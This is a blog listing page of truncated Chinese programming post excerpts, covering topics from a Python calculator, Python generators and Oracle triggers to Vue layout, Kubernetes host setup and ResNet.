</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/945fcb5c2f8021ed70c1e10275986535/" rel="bookmark">
			使用Python编程出高级计算器，支持加减乘除、复合运算、三角函数、平方根、二进制转换、幂运算等高阶运算
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		生活不易，缅怀一下python课设，帮助下一个有缘人 注意：里面有两个python计算器的代码，从高阶到低阶应有尽有 第一个计算器功能： 实现简单的加减乘除，支持小数点和负数运算 实现复合运算和取余运算 实现sin，arcsin，ln，平方根，以及幂的运算 实现十进制到二进制转换 实现e，π的输出 可以复制粘贴剪切计算器中的数据 可以全部清除和只清除一个 计算器样式 代码
calculate.py import re from math import * # 将算式从字符串处理成列表，解决横杠是负号还是减号的问题 def formula_format(formula): """ 解释参数类型 :param formula: str """ formula = re.sub(' ', '', formula) # re.sub()在一个字符串中替换所有匹配正则表达式的子串，返回替换后的字符串 # 去掉算式中的空格s # 以 '横杠数字' 分割， 其中正则表达式：(\-\d+\.?\d*) 括号内： # \- 表示匹配横杠开头；\d+ 表示匹配数字1次或多次；\.?表示匹配小数点0次或1次;\d*表示匹配数字0次或多次。 # []中的字符是任选择一个使用，括号(…)可以把(…)看出一个整体,经常与"+"、"*"、"?"的连续使用,对（…）部分进行重复. formula_list = [i for i in re.split('(\-[\d+,π,e]\.?\d*)', formula) if i] # re.split()将一个字符串按照正则表达式匹配结果进行分割，返回列表类型 final_formula = [] # 最终的算式列表 for item in formula_list: # 算式以横杠开头，则第一个数字为负数，横杠为负号 # re.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/945fcb5c2f8021ed70c1e10275986535/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/61dfbf6418c2cbcc2b8931ac81c2af72/" rel="bookmark">
			计算机网络——数据链路层の选择题整理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		数据链路层的功能 1、数据链路层协议的功能不包括（）
A、定义数据格式
B、提供结点之间的可靠传输
C、控制对物理传输介质的访问
D、为终端结点隐蔽物理传输的细节
解析：选D
对于A，定义数据格式，即采用帧作为传输单元
对于B，提供结点之间的可靠传输，是通过有确认连接以及差错控制实现的
对于C，对物理介质的访问的控制，是数据链路层中的MAC层（介质访问子层）实现的。它定义了数据帧怎样在介质上进行传输。
对于D，数据链路层不需要考虑如何实现比特流从传输，因此不用为终端结点隐蔽物理传输的细节
2、对于信道比较可靠且对实时性要求高的网络，数据链路层采用（）比较合适
A、无确认的无连接服务
B、有确认的无连接服务
C、无确认的面向连接服务
D、有确认的面向连接服务
解析：选A
因为网络的信道比较可靠，所以错误率比较小，可以采用无连接的方式，且网络对实时性要求比较高，因此要采用无确认的方式，因为确认的话需要花费的时间比较多，且如果是面向连接，再发送之前还需要建立通路，也会花费时间，减低实时性。
3、假设物理信道的传输成功率是95%，而平均一个网络层分组需要10个数据链路层帧来发送。若数据链路层采用无确认的无连接服务，则发送网络层分组的成功率是（）
A、40%
B、60%
C、80%
D、95%
解析：选B
成功发送一个的概率是95%，所以成功发送十个的概率是(95%)10=(0.95)10≈60%
差错控制 1、通过提高信噪比可以减弱其影响的差错是（）
A、随机差错
B、突发差错
C、数据丢失差错
D、干扰差错
解析：选A
一般来说，数据的传输差错是由噪声引起的。通信信道的噪声可以分为两类：
①热噪声，一般是信道固有的，引起的差错是随机差错，可以通过提高信噪比来降低它对数据传输的影响。
②冲击噪声，一般是由外界电磁干扰引起的，引起的差错是突发差错，它是引起传输差错的主要原因，无法通过提高信噪比来避免。
2、为了纠正2比特的错误，编码的海明距应该为（）
A、2
B、3
C、4
D、5
解析：选B
海明码 纠错 d位，需要的海明距为 2d+1
海明码 检错 d位，需要的海明距为 d+1
流量控制与可靠传输机制 1、主机甲与主机乙之间使用后退N帧协议（GBN）出传输数据，甲的发送窗口尺寸为1000，数据帧长为1000字节，信道带宽为100Mb/s，乙每收到一个数据帧立即用一个短帧（忽略其传输延迟）进行确认，若甲、乙之间的单向传播时延是50ms，则甲可以达到的最大平均数据传输速率约为（）
A、10Mb/s
B、20Mb/s
C、80Mb/s
D、100Mb/s
解析：选C
甲可以达到的最大平均数据传输速率受①信道带宽；②发送第一个帧后在第一个帧到达之前能发送的帧的数量 的限制。实际速率取两者最小值，根据题目已知，信道带宽是100Mb/s，因此对于限制条件①，可以取得的最大传输速率为100Mb/s。
对于限制条件②，因为甲的发送窗口为1000，数据帧长为1000字节，因此可以发送的数据长度为1000*1000B=1MB。发送一个帧的发送时延为：(1000B/100Mb/s)+50ms+50ms=0.10008s，因此数据传输速率为1MB/0.10008s≈80Mb/s。
综上甲可以达到的最大平均数据传输速率为min{100Mb/s，80Mb/s}=80Mb/s
2、主机甲通过128kb/s卫星链路，采用滑动窗口协议向主机乙发送数据，链路单向传播时延为250ms，帧长为1000字节。不考虑确认帧的开销，为使链路利用率不小于80%，帧序号的比特数至少是（）
A、3
B、4
C、7
D、8
解析：选B
求帧序号的比特数，即求一个传输时间内，传输的帧的数量
发送一个帧所需要的时间T=一个帧的传输时延+一个帧的传播时延+确认帧的传输时延+确认帧的传播时延，因为题目中明确不考虑确认帧的开销，即不考虑确认帧的传输时延。故T=(1000B/128kb/s)+250ms*2=0.5625s。
因为要保证链路利用率不小于80%，所以假设数据大小为L，(L/128kb/s)/T&gt;=0.8，所以L=7.2，即所需要的比特数n，应该保证2n-1&gt;=7.2，因此n至少是4
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/61dfbf6418c2cbcc2b8931ac81c2af72/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1395a66125010d9a3e14a38c93786da9/" rel="bookmark">
			python中yield的用法详解——最简单，最清晰的解释
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先，如果你还没有对yield有个初步分认识，那么你先把yield看做“return”，这个是直观的，它首先是个return，普通的return是什么意思，就是在程序中返回某个值，返回之后程序就不再往下运行了。看做return之后再把它看做一个是生成器（generator）的一部分（带yield的函数才是真正的迭代器），好了，如果你对这些不明白的话，那先把yield看做return,然后直接看下面的程序，你就会明白yield的全部意思了：
def foo(): print("starting...") while True: res = yield 4 print("res:",res) g = foo() print(next(g)) print("*"*20) print(next(g)) 就这么简单的几行代码就让你明白什么是yield，代码的输出这个
starting... 4 ******************** res: None 4 我直接解释代码运行顺序，相当于代码单步调试：
1.程序开始执行以后，因为foo函数中有yield关键字，所以foo函数并不会真的执行，而是先得到一个生成器g(相当于一个对象)
2.直到调用next方法，foo函数正式开始执行，先执行foo函数中的print方法，然后进入while循环
3.程序遇到yield关键字，然后把yield想想成return,return了一个4之后，程序停止，并没有执行赋值给res操作，此时next(g)语句执行完成，所以输出的前两行（第一个是while上面的print的结果,第二个是return出的结果）是执行print(next(g))的结果，
4.程序执行print("*"20)，输出20个
5.又开始执行下面的print(next(g)),这个时候和上面那个差不多，不过不同的是，这个时候是从刚才那个next程序停止的地方开始执行的，也就是要执行res的赋值操作，这时候要注意，这个时候赋值操作的右边是没有值的（因为刚才那个是return出去了，并没有给赋值操作的左边传参数），所以这个时候res赋值是None,所以接着下面的输出就是res:None,
6.程序会继续在while里执行，又一次碰到yield,这个时候同样return 出4，然后程序停止，print函数输出的4就是这次return出的4.
到这里你可能就明白yield和return的关系和区别了，带yield的函数是一个生成器，而不是一个函数了，这个生成器有一个函数就是next函数，next就相当于“下一步”生成哪个数，这一次的next开始的地方是接着上一次的next停止的地方执行的，所以调用next的时候，生成器并不会从foo函数的开始执行，只是接着上一步停止的地方开始，然后遇到yield后，return出要生成的数，此步就结束。
def foo(): print("starting...") while True: res = yield 4 print("res:",res) g = foo() print(next(g)) print("*"*20) print(g.send(7)) 再看一个这个生成器的send函数的例子，这个例子就把上面那个例子的最后一行换掉了，输出结果：
starting... 4 ******************** res: 7 4 先大致说一下send函数的概念：此时你应该注意到上面那个的紫色的字，还有上面那个res的值为什么是None，这个变成了7，到底为什么，这是因为，send是发送一个参数给res的，因为上面讲到，return的时候，并没有把4赋值给res，下次执行的时候只好继续执行赋值操作，只好赋值为None了，而如果用send的话，开始执行的时候，先接着上一次（return 4之后）执行，先把7赋值给了res,然后执行next的作用，遇见下一回的yield，return出结果后结束。
5.程序执行g.send(7)，程序会从yield关键字那一行继续向下运行，send会把7这个值赋值给res变量
6.由于send方法中包含next()方法，所以程序会继续向下运行执行print方法，然后再次进入while循环
7.程序执行再次遇到yield关键字，yield会返回后面的值后，程序再次暂停，直到再次调用next方法或send方法。
这就结束了，说一下，为什么用这个生成器，是因为如果用List的话，会占用更大的空间，比如说取0,1,2,3,4,5,6…1000
你可能会这样：
for n in range(1000): a=n 这个时候range(1000)就默认生成一个含有1000个数的list了，所以很占内存。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1395a66125010d9a3e14a38c93786da9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f55f1f0fd928a0685a80cc7ddfd24156/" rel="bookmark">
			PLSQL中Oracle设置主键自增
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、新建序列
Name : 创建的名字 --红框处
Min value : 最小计数
Max value : 最大计数
Start with : 起始计数
Increment by : 步长
Cache size : 缓存序列
Cycle : 循环序列
SQL语句：
-- Create sequence create sequence GOODSFREQUENCY_ZID minvalue 1 maxvalue 99999999999999999999 start with 1 increment by 1 cache 20 cycle; 2、新建触发器
对应修改触发器、表、序列以及主键
SQL语句：
create or replace trigger goodsfrequency_zid before insert on "GOODSFREQUENCY_ZH" for each row begin select goodsfrequency_zid.nextval into :new."ID" from dual; end; 3、运行正常
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f55f1f0fd928a0685a80cc7ddfd24156/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a3a3e95519c1c187b55b3ef545085ad6/" rel="bookmark">
			实用的GCC Makefile语法及参数详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		二话不说，先上一个Makefile的源码。
基于下述的Makefile，可以直接执行命令:
编译： make or make -f Makefile all
清除： make clean or make -f Makefile clean
CC = g++ CUR_PATH = $(PWD) FLAGS = -std=c++11 -O2 -W -Wall FLAGS += -I/home/project/opencv/build/ -I/home/project/opencv/include/ FLAGS += -I/home/project/opencv/modules/calib3d/include #FLAGS += ... 其他必要的头文件的路径 LDFLAGS = -L../libopencv_calib3d.a LDFLAGS += ./libopencv_core.a LDFLAGS += ./libopencv_dnn.a LDFLAGS += ./libopencv_core.a LDFLAGS += ./libopencv_features2d.a LDFLAGS += ./libopencv_flann.a LDFLAGS += ./libopencv_gapi.a LDFLAGS += ./libopencv_highgui.a LDFLAGS += ./libopencv_imgcodecs.a LDFLAGS += .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a3a3e95519c1c187b55b3ef545085ad6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d194b5f31c9c3c0206fc37960c79005f/" rel="bookmark">
			maven--mvn命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原文网址：maven--mvn命令_IT利刃出鞘的博客-CSDN博客
格式 maven 命令的格式为 mvn [plugin-name]:[goal-name]，可以接受的参数如下，
参数
含义
mvn -v, --version
显示版本信息;
mvn -V, --show-version
显示版本信息后继续执行Maven其他目标;
mvn -h, --help
显示帮助信息;
mvn -e, –errors 控制Maven的日志级别，产生执行错误相关消息;
mvn -X, --debug
控制Maven的日志级别，产生执行调试信息;
mvn -e显示maven运行出错的信息； mvn -q, --quiet
控制Maven的日志级别,仅仅显示错误;
mvn -Pxxx
激活 id 为 xxx的profile (如有多个，用逗号隔开);
mvn -Dxxx=yyy
指定Java全局属性。如 -Dmaven.test.skip=true 跳过单元测试；
mvn -o , --offline
运行offline模式，不联网更新依赖;
mvn -N, --non-recursive
仅在当前项目模块执行命令，不构建子模块;
mvn -pl, --module_name
在指定模块上执行命令;
mvn -ff, --fail-fast
遇到构建失败就直接退出;
mvn -fn, --fail-never
无论项目结果如何,构建从不失败;
mvn -fae, --fail-at-end
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d194b5f31c9c3c0206fc37960c79005f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1a2838893dc26406d47e417ce91bd38b/" rel="bookmark">
			微信小程序-flex布局：垂直、水平方向-自动填充满剩余空间
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在微信小程序项目中经常需要将水平或垂直方向分成两大部分，一部分内容宽度或高度固定，剩余的一部分需填充满剩余空间。那么，该怎么快速解决这类布局？
效果图如下：
垂直方向：
水平方向：
我个人比较喜欢使用flex布局，面对此类布局，最先想到的也是flex布局。常见的flex布局中，可设置flex:1,相当于设置父盒子display:flex,即伸缩布局，flex为1，是子盒子占了一份，自动放大填满剩余的空间。若还有另一个子盒子也设置flex；1，即这个父盒子被两个子盒子平分，各占一半。若另一个子盒子设置flex:2,也就是父盒子被所有子盒子平分成3份，以此类推。
常见的flex属性值：
1.flex:1,也就是flex-grow:1,也就是上面说的自动放大填充满剩余空间，若有其他子盒子设置flex，则平分。
2.flex:0 0 auto,等同于flex:none,子元素的长度决定它的长度，当整体空间不足时，它也不会缩小，有剩余空间也不放大。相当于它是由子元素固定大小，不放大也不缩小。
3.flex:1 1 auto,等同于flex:auto,由子元素的宽（width）高(height)属性来改变大小。如果和flex:0 0 auto一起使用就是自适应宽度，自动填充剩余空间。
以下为水平和垂直方向例子：
假设页面高度为100%，第一部分的高度为200rpx,那么剩余的部分填充满剩余空间。container2为页面的外层元素，拆分为两个部分，第一部分为red,另一部分为blue。
要想页面高度一开始就是100%，可以在wxss中设置page样式。
page { width: 100%; height: 100%; } 1.垂直方向：
wxml完整代码如下：
&lt;view class="container2"&gt; &lt;view class="fixedWidth"&gt; &lt;view class="red"&gt;1&lt;/view&gt; &lt;/view&gt; &lt;view class="autoFullWidth"&gt; &lt;view class="blue"&gt;2&lt;/view&gt; &lt;/view&gt; &lt;/view&gt; wxss完整代码如下：
注意：
container2需要设置display: flex;flex-direction: column;(column为垂直方向）
剩余空间autoFullWidth需要用定位，
要不然剩余空间就不会自动占满100%，
page { width: 100%; height: 100%; } .container2 { width: 100%; height: auto; min-height: 100%; background-color: #fff; position: relative; display: flex; flex-direction: column; } /* 固定宽度 */ .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1a2838893dc26406d47e417ce91bd38b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/48babb0ab0c527168a418c9ff42683e1/" rel="bookmark">
			Vue 获取元素的宽度高度
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		&lt;div ref="content"&gt;&lt;/div&gt; var ref = this.$refs.content.$el; 此时获取的就是div这个dom元素。
ref.width 仅包含元素宽度，不包含padding、border、margin；
ref.height 仅包含元素高度，不包含padding、border、margin；
ref.clientWidth 包含元素宽度、padding，不包含border、margin；
ref.clientHeight 包含元素高度、padding，不包含border、margin；
ref.offsetWidth 包含元素宽度、padding、border，不包含margin；
ref.offsetHeight 包含元素高度、padding、border，不包含margin；
ref.scrollWidth 包含元素宽度、padding、溢出宽度，不包含border、margin，如果不溢出
与clientWidth一致；
ref.scrollHeight 包含元素高度、padding、溢出高度，不包含border、margin，如果不溢出
与clientHeight一致；
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bb538e822fbaf0572354621ade6e93e8/" rel="bookmark">
			太戈编程 19题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		19. 谁考了第k名 题目描述
在一次考试，每个学生的成绩均不相同，现在知道学生的学号和成绩，求考第k名学生的学号和成绩。
输入输出格式
输入格式 第一行两个整数n, k，分别表示学生人数和要求的第k名学生，1&lt;=n&lt;=100, 1&lt;=k&lt;=n。 其后有n行，每行一个字符串和一个浮点数，分别表示学号和成绩。 输出格式 第k名学生的学号和成绩 代码： #include&lt;cstdio&gt; #include&lt;cmath&gt; #include&lt;iostream&gt; #include&lt;cstring&gt; #include&lt;algorithm&gt; using namespace std; struct e { string c; double d; }; e a[101]; bool cmp(e a, e b) { return a.d &gt; b.d; } int main() { int i, n, k; cin &gt;&gt; n &gt;&gt; k; for (i = 1; i &lt;= n; i++) { cin &gt;&gt; a[i].c &gt;&gt; a[i].d; } sort(a + 1, a + 1 + n, cmp); cout &lt;&lt; a[k].
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bb538e822fbaf0572354621ade6e93e8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/782b03b13c861d20d8cca68380b09f80/" rel="bookmark">
			【泛微E9】待办、已办页面显示内容调整
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		PC端流程待办列表各TAB地址 全部：OA地址/wui/index.html#/main/workflow/listDoing?tabkeys=0
未读：OA地址/wui/index.html#/main/workflow/listDoing?tabkeys=1
反馈：OA地址/wui/index.html#/main/workflow/listDoing?tabkeys=2
超时：OA地址/wui/index.html#/main/workflow/listDoing?tabkeys=3
被督办：OA地址/wui/index.html#/main/workflow/listDoing?tabkeys=4
待处理：OA地址/wui/index.html#/main/workflow/listDoing?tabkeys=5
待阅：OA地址/wui/index.html#/main/workflow/listDoing?tabkeys=6
被退回：OA地址/wui/index.html#/main/workflow/listDoing?tabkeys=7
转发：OA地址/wui/index.html#/main/workflow/listDoing?tabkeys=8
抄送：OA地址/wui/index.html#/main/workflow/listDoing?tabkeys=9
PC端流程已办列表各TAB地址 全部：OA地址/wui/index.html#/main/workflow/listDone?tabkeys=10
未归档：OA地址/wui/index.html#/main/workflow/listDone?tabkeys=11
已归档：OA地址/wui/index.html#/main/workflow/listDone?tabkeys=12
待回复：OA地址/wui/index.html#/main/workflow/listDone?tabkeys=13
未读：OA地址/wui/index.html#/main/workflow/listDone?tabkeys=14
反馈：OA地址/wui/index.html#/main/workflow/listDone?tabkeys=15
PC端流程我的请求列表各TAB地址 全部：OA地址/wui/index.html#/main/workflow/listMine?tabkeys=16
未归档：OA地址/wui/index.html#/main/workflow/listMine?tabkeys=17
已归档：OA地址/wui/index.html#/main/workflow/listMine?tabkeys=18
未读：OA地址/wui/index.html#/main/workflow/listMine?tabkeys=19
反馈：OA地址/wui/index.html#/main/workflow/listMine?tabkeys=20
PC端待办、已办、我的请求、查询流程、关注事宜、督办事宜、流程监控单页地址信息----【可用于配置自定义链接到门户菜单】 待办列表：OA地址/spa/workflow/static/index.html#/main/workflow/listDoing
已办列表：OA地址/spa/workflow/static/index.html#/main/workflow/listDone
我的请求：OA地址/spa/workflow/static/index.html#/main/workflow/listMine
查询流程条件页面：OA地址/spa/workflow/static/index.html#/main/workflow/queryFlow
查询流程列表页面：OA地址/spa/workflow/static/index.html#/main/workflow/queryFlowResult
关注事宜：OA地址/spa/workflow/static/index.html#/main/workflow/attention
督办事宜：OA地址/spa/workflow/static/index.html#/main/workflow/supervise
流程监控条件页面：OA地址/spa/workflow/static/index.html#/main/workflow/monitor
流程监控列表页面：OA地址/spa/workflow/static/index.html#/main/workflow/monitorResult(不建议直接使用此地址配置自定义链接，当数据较多时全量查询接口会比较慢)
以上维度，tabkeys可以传递多个，中间以"，"分隔。
当且仅当传递的维度属于当前url的维度，并且对应tab的isshow等于1时，才会显示指定维度数据，否则默认显示全部维度的数据。同时当传递两个及以上维度的tabkeys时，默认显示全部tab维度，数据是有效维度的集合。
这些数据都存在workflow_dimension表中。以后如果想添加自定义维度数据，可以通过在这张表中插入数据，直接添加。具体对应关系如下（下方是【所属范围】字段对应值说明及相关信息说明）：
***（doing：此类型的tab配置好后只会显示在___PC端待办列表___中，显示的最大数据量是当前用户所有待办流程）
***（done：此类型的tab配置好后只会显示在___PC端已办列表___中，显示的最大数据量是当前用户所有已办流程）
***（mine：此类型的tab配置好后只会显示在___PC端我的请求列表___中，显示的最大数据量是当前用户所有自己申请的流程）
***（portal：此类型的tab配置好后只会显示在___PC端门户流程中心___可选显示类型，显示的最大数据量是当前用户所有参与过的流程）
***（emDoingApp：此类型的tab配置好后只会显示在___移动端待办应用___中，显示的最大数据量是当前用户所有待办流程）
***（emDoneApp：此类型的tab配置好后只会显示在___移动端已办应用___中，显示的最大数据量是当前用户所有已办流程）
***（emMineApp：此类型的tab配置好后只会显示在___移动端我的请求应用___中，显示的最大数据量是当前用户所有自己发起的流程）
***（emFinApp：此类型的tab配置好后只会显示在___移动端办结应用___中，显示的最大数据量是当前用户所有已办并且已经归档的流程）
***（emCopyApp：此类型的tab配置好后只会显示在___移动端抄送应用___中，显示的最大数据量是当前用户所有待办中抄送给自己的流程）
***（下面描述到的65~83Tab在20200101kb中发布，默认隐藏，可根据需求直接设置isshow属性放开即可显示）
***（反馈sql条件如果需要请单独联系我获取，不同数据库写法稍有差异）
***（sqlwhere为sql片段，只能使用___workflow_requestbase、workflow_currentoperator___表中的字段，别名分别为___t1、t2___，其余表字段请使用exist或者in关联）
***（以下是标准已经定义好的tab，可以直接使用，但是不允许更改，如果要更改，请在workflow_dimension表中插入一条数据，更改新增的数据）
***（以下数据查询sql：select a.typeid,b.indexdesc,a.scope from workflow_dimension a,htmllabelindex b where a.typetitle = b.id order by typeid）
TypeidTabName所属范围对应维度下筛选数据的sql条件0全部doing((t2.isremark=0 and (t2.takisremark is null or t2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/782b03b13c861d20d8cca68380b09f80/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/11c3b48a04507194a0393dd4ecf82edb/" rel="bookmark">
			RNN基本原理及代码实战
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、RNN是什么？
RNN全名循环神经网络，主要用于时间序列数据分析预测。与传统的ANN区别在于其将前一网络输出的部分信息保存并传递给后面的一层参与计算，使前后两个RNN模块建立关联。
| 传统ANN结构
| RNN节后结构
从上图我们可以看出RNN较ANN增加了一个权重W，现在我们来看看W是什么。循环神经网络的隐藏层的值s不仅仅取决于当前这次的输入x，还取决于上一次隐藏层的值s。权重矩阵 W就是隐藏层上一次的值作为这一次的输入的权重。
这里借用一张图表示其W的运作过程
我们从上图就能够很清楚的看到，上一时刻的隐藏层是如何影响当前时刻的隐藏层的。
如果我们把上面的图展开，循环神经网络也可以画成下面这个样子
以上是三个RNN结构，其用公式为下图结果，每一层的均会传递权重矩阵W到下一层参与计算。
二、用途
那RNN到底用来做什么呢，首先RNN是对数据分析，其主要用于时间序列数据预测，即按照时间顺序输入已知的数据，来推断未来时间对应的数据值，应用领域比较多
应用场景如下：
文本生成：类似上面的填空题，给出前后文，然后预测空格中的词是什么。 机器翻译：翻译工作也是典型的序列问题，词的顺序直接影响了翻译的结果。 语音识别：根据输入音频判断对应的文字是什么。 生成图像描述：类似看图说话，给一张图，能够描述出图片中的内容。这个往往是 RNN 和 CNN 的结合。 这里引用文本识别的动图简单介绍下本文预测的过程
如上图所示，我们属于的文本是：What time，想预测后续单词，后续输出结果是：is it ？
案例就简单介绍到这里。
三、实战分享
股票数据预测
直接上代码。
运行环境：pycharm，python3.6，tensorflow=2.4
import os,math from tensorflow.keras.layers import Dropout, Dense, SimpleRNN from sklearn.preprocessing import MinMaxScaler from sklearn import metrics import numpy as np import pandas as pd import tensorflow as tf import matplotlib.pyplot as plt # 支持中文 plt.rcParams['font.sans-serif'] = ['SimHei'] # 用来正常显示中文标签 plt.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/11c3b48a04507194a0393dd4ecf82edb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2bb83db3e200490da6a09b5b4d436756/" rel="bookmark">
			k8s(v1.24)集群安装-软件环境
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		建议使用centos7、不建议centos8，centos7到2024年，contos8到2021年停止更新
禁止Swap分区
sed -i '/swap/s/^/#/' /etc/fstab swapoff -a 关闭防火墙
systemctl stop firewalld systemctl disable firewalld centos7 关闭network manager
systemctl stop NetworkManager #临时关闭 systemctl disable NetworkManager #永久关闭网络管理命令 关闭selinux
sed -i 's/enforcing/disabled/' /etc/selinux/config setenforce 0 优化limit
ulimit -SHn 65535 #单用户可以打开的最大文件数量，可以设置为官方推荐的65536或更大些 echo "* - nofile 655360" &gt;&gt; /etc/security/limits.conf #单用户线程数调大 echo "* - nproc 131072" &gt;&gt; /etc/security/limits.conf echo "* - memlock unlimited" &gt;&gt; /etc/security/limits.conf #单进程可以使用的最大map内存区域数量 echo "vm.max_map_count = 655360" &gt;&gt; /etc/sysctl.conf 参数修改立即生效
sysctl -p 查看主机名
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2bb83db3e200490da6a09b5b4d436756/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f526edb2bc2d58d28294505a6337c731/" rel="bookmark">
			ResNet解读和1×1卷积介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、Introduction 深度卷积网络好在哪里？
-----它可以加很多层，把网络变得很深，不同程度的层可以得到不同等级的特征。
作者提出一个问题--一个网络只是简单的堆叠就好了嘛？
——不是，当网络变得很深的时候，梯度会出现爆炸或者消失。一个解决方法，初始化时设置一个合适的权重，不要太大也不要太小。又或者在中间加入normalization（包括BN）,可以使得校验每个层之间的那些输出和它梯度的那些均值和方差。上述两个方法可以让网络收敛，但是网络变深后，性能会变差（不是过拟合造成的，因为训练误差和测试误差都会变得很差），所以现在网络虽然收敛了，但是不能得到一个好的效果。
考虑一个比较浅的网络版本和一个比较深的网络版本（所谓深的版本是在所说的浅的网络中多加一些层进去），作者说如果你的浅的网络效果还不错的话，理论上深的网络是不应该变差的，因为深的网络加的那些层，总是可以把那些层学的变成一个恒等映射（identity mapping）。实际上做不到，SGD找不到这样一个优解。
这篇文章提出了一个方法，使得显示的构造出一个 identity mapping，深的网络不会变得比浅的网络差。作者命名为deep residual learning framework 。
2、结构 X 为浅层网络的输出。如果我们想要得到的映射为H(X)，则我们让添加的非线性网络层去拟合残差映射F(X):=H(X)-X。原始的映射就可以写成F(X)+X。
shortcut connection快捷连接通常会跳过 1 个或者多个层，在 ResNet 中快捷连接直接运用了 identity mapping，意思就是将一个卷积栈的输入直接与这个卷积栈的输出相加。
这样有什么好处呢？
并没有增加新的参数整个网络也仍然可以由 SGD 进行训练。容易被通用的神经网络框架实现。 F(X)和X直接相加，因此需要保证他们的维度一定要一样。
如何处理输入和输出不同形状的情况？
---第一种，在输入和输出上添加一些额外的零，使得这两个形状能够对应起来，然后可以相加。
--第二种，投影，使用一个1×1卷积调整通道，使得形状可以对应起来。（1×1卷积层特点--在空间维度上不做任何的东西，主要是在通道维度上做改变，选择一个1×1卷积使得输出通道是输入通道的两倍，这样就能将残差连接的输入和输出对应起来。在ResnNet里面，如果把输出通道数翻了两倍，那么输入的高和宽会减小一半，所以这里步幅设置为2，使在高宽和通道上都能匹配上）。第三种，所有连接都做投影。（这里在论文中有做实验比较三种处理方法的优劣）
各种层数的残差结构
残差网络结构（以34层为例）--VGG-19是浅层网络
更深的残差网络结构（50层以上），结构有所不同，设计了一个bottleneck结构
通道数为256时，变得很大，出现的问题是计算复杂度会很高，这里做法是通过1×1卷积投影映射回64维，再做一个3×3通道数不变的卷积，然后再通过1×1卷积投影回去256维，因为输入是256维u，输出要匹配上，这样设计之后复杂度就跟左图差不多了。
补充-关于1×1卷积 理解1×1卷积的作用_dxwell6的博客-CSDN博客_1×1卷积
1*1卷积核的作用_nefetaria的博客-CSDN博客_1*1卷积核的作用
详细学习1*1卷积核_来一包板栗的博客-CSDN博客_1*1卷积
1×1卷积就是将卷积核的尺寸设置为1×1，如图所示
1×1卷积的意义
跨通道的特征整合 如果当前层和下一层都只有一个通道那么1×1卷积核确实没什么作用，但是如果它们分别为m层和n层的话，1×1卷积核可以起到一个跨通道聚合的作用，所以进一步可以起到降维（或者升维）的作用，起到减少参数的目的。
一个例子来直观地介绍1x1卷积。输入6x6x1的矩阵，这里的1x1卷积形式为1x1x1，即为元素2，输出也是6x6x1的矩阵。但输出矩阵中的每个元素值是输入矩阵中每个元素值x2的结果。
上述情况，并没有显示1x1卷积的特殊之处，那是因为上面输入的矩阵channel为1，所以1x1卷积的channel也为1。这时候只能起到升维的作用。这并不是1x1卷积的魅力所在。 当输入为6x6x32时，1x1卷积的形式是1x1x32，当只有一个1x1卷积核的时候，此时输出为6x6x1。此时便可以体会到1x1卷积的实质作用：降维。当1x1卷积核的个数小于输入channels数量时，即降维。
注：1x1卷积一般只改变输出通道数（channels），而不改变输出的宽度和高度
2. 特征通道的升维和降维
3、减少卷积核参数（简化模型） 可以看到1×1卷积核通过控制卷积核的数量来进行降维和升维
网络深度由原来的2层变成了三层，广泛使用1×1卷积可以增加模型的深度，增加模型非线性能力
应用一
